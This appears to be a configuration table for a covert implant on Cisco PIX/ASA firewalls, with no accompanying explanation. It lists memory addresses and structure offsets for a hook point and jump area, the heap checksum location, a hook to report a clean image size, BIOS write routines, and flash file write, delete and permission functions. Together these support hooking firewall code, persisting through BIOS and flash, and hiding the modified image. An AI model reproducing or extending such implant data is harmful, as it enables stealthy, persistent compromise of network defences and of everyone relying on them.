; --- SECTION I ---
;
0x4008250d            // pix version
0x2199000             // address of implant configuration
0x0   0x08ac3240      // allocb
0x1   0x08ac2bf0      // freeb
0x2   0x08066cc0      // open (7.0(+) this is an array for Channel Stuff)
0x3   0x0852f070      // ip_put
0x4   0x08066e20      // close
0x5   0x0932ace0      // atoip
0x6   0x0936c1bc      // memset
0x7   0x0934e4b0      // memmove
0x8   0x0934dc50      // malloc_call_calloc
0x9   0x0934da70      // free
0xa   0x08066010      // kprintf
0xb   0x00000014      // interface offset in metaframe
0xc   0x00000010      // offset for vlan number in interface struct
0xd   0x00000094      // metaframe offset in block structure
0xe   0x00000078      // interface semiphore in metaframe
0xf   0x0934fe20      // rand
0x15  0x080635c0      // process_create
0x16  0x08064a30      // process_suspend
0x17  0x08065010      // process_sleep_for
0x18  0x088e7190      // show_process
0x19  0xffffff5c      // offset to security level in int_struct
0x1a  0x00000000      // cur_t
0x1b  0x04            // channel offset in interface struct
0x1c  0x0c            // PUT offset in channel struct
0x1d  0x24            // offset to dest mac in arp structure
0x1e  0x10            // offset to next hop ip in route structure
0x1f  0x20            // size of route struct
0x20  0x085301c0      // calc_ip_cksum
0x21  0x08530c90      // arp_loopkup
0x22  0x0852f690      // set_block_hdr_mac_and_proto
0x23  0x08541270      // get hardware interface
0x24  0x0885d3d0      // get next hop
0x25  0x0885d690      // get route
0x26  0x0852b420      // send_it
0x27  0x08533560      // arp_create
0x28  0x08942530      // get_hw_iface_2
0x2a  0x64            // pointer to ethernet frame
0x2b  0x5c            // wptr structure offset
0x2c  0x44            // inIfc (incoming interface) structure offset
0x2e  0x000001ac      // offset from cur_t that contains the current context number
0x2f  0x09ea90e0      // pointer to channnel list
0x30  0x09e98b30      // address of NIC database
0x31  0x00000014      // offset to vlan struct in metaframe (interface offset)
0x32  0x00000018      // offset to IP address in int_struct
0x33  0x00000128      // iface struct adjust from metaframe
0x34  0x09eb6ef8      // max number of interface cards
0x35  0x09fd6148      // internal_clock
0x36  0x089406c0      // get_interface_mac
0x37  0x000000df      // offset to hardware interface number in interface struct
0x38  0x10            // offset to ip in route structure
0x39  0x00            // offset to interface num in route structure
0x3a  0x00000424      // offset to send channel in channel list
0x3b  0x084835f0      // ifs_read; flash file read routine -- IFS: Read:
0x3c  0x084836d0      // ifs_write; flash file write routine -- IFS: Write:
0x3d  0x08482c30      // ifs_open; flash file open routine -- IFS: Opened: 
0x3e  0x08483510      // ifs_close; flash file close routine -- IFS: Close: 
0x3f  0x00000040      // offset to next IP fragment pointer in block
0x40  0x09ffbe00      // address of context list
0x42  0x093699c0      // checkheaps checksum location
0x43  0x0851e610      // get booted image's filename
0x44  0x083b484f      // fix image size hook point
0x45  0x01cee864      // clean image file size
0x46  0xffffffff      // asa fix image size hook point
0x47  0x2c            // offset to filesize in file info struct
0x52  0x08566470      // ipv6_encap
;
; --- END OF SECTION I ---
;
:EOS:
;
; --- SECTION II ---
;
HookLocation              0x087189ab      // address of our hook point
HookedCall                0x0871d000      // called function being hooked
JmpLocation               0x09372c20      // empty area to jump to
InterfaceAddr             0x09e98b30      // same as 0x30 above
InterfaceLeng             0x000001a4      // length of interface struct
IntSecurityOffset         0xffffff5c            // security level field offset
IntNameOffset             0x00000174      // interface name field offset
IntNumOffset              0x000000df      // interface number field offset
IntVlanOffset             0x10            // same as 0xc above
IntIPOffset               0x18            // ip address offset in the interface struct
IntNetmaskOffset          0x1c            // netmask in the iface struct
FlashClassAddr            0x00000000      // addr of flash structure (not used in 7.*)
CryptoDeviceAddr          0xffffffff      // addr of crypto structure
ArpTableAddrPtr           0x099ea19c      // addr of first entry in ARP table
NumInterfaces             0x00000000      // addr of pointer to number of interfaces (not used in 7.*)
IfaceStruct2              0x00000000      // addr of pointer to second smaller interface struct (not used in 7.*)
IfaceStruct2Len           0x00            // length of 2nd smaller interface struct used by arp cache (not used in 7.*)
BiosClassAddr             0x09febc80      // addr of the bios class structure
BiosWriteAddr1            0x083a87b0      // addr of the bios write function for one specific bios
BiosWriteAddr2            0x083abdf0      // addr of the bios write function for one specific bios
BiosWriteAddr3            0x083abb70      // addr of the bios write function for one specific bios
BiosWriteAddr4            0x083ac9c0      // addr of the bios write function for one specific bios
BiosWriteOffset           0x00000020      // offset into the bios structure where write addr is located
FlashMkdirAddress         0x084841e0      // ifs_mkdir; make flash directory routine -- IFS: Mkdir
ASAFlashRmdirAddress      0x083b5ac0      // ifs_rmdir; remove flash directory routine for the asa
PIXFlashRmdirAddress      0x08398360      // ifs_rmdir; remove flash directory routine for the pix
ASAFlashRmfileAddress     0x083b51b0      // ifs_rmfile; remove flash file routine for the asa
PIXFlashRmfileAddress     0x08398040      // ifs_rmfile; remove flash file routine for the pix
FlashDirlistAddress       0x084838d0      // ifs_get_dir_entry; get the next file name from a directory listing
FlashGetSizeAddress       0x084844c0      // ifs_get_size; get the size of the provided open file
FlashChmodAddress         0x08483d70      // ifs_chmod; change the permissions on a file
FlashMoveFileAddress      0x08483ed0      // ifs_rename; move a file
FlashGetFileInfoAddress   0x00000000      // ifs_get_file_info; returns a structure that contains information about a file, including its size
FlashGetSpaceAddress      0x08485390      // ifs_get_space_info; returns used and free space in flash
FlashFileInfoSizeOffset   0x0000002c      // The offset to the file size in the structure returned by ifs_get_file_info
GetPlatformStringAddr     0x09361190      // The address of a function that returns the platform string 
ASARestatFlashFlagAddr    0xffffffff      // The address of the flag that tells the OS on the ASA to re-stat the files in flash (causes used space to be updated)
AnnounceFunc              0x08066ad0      // addr of the device announce function
DevIoctlOffset            0x70            // offset to ioctl function in device table
DuartTtyAddr              0x09951d20      // addr of duart/0 tty entry
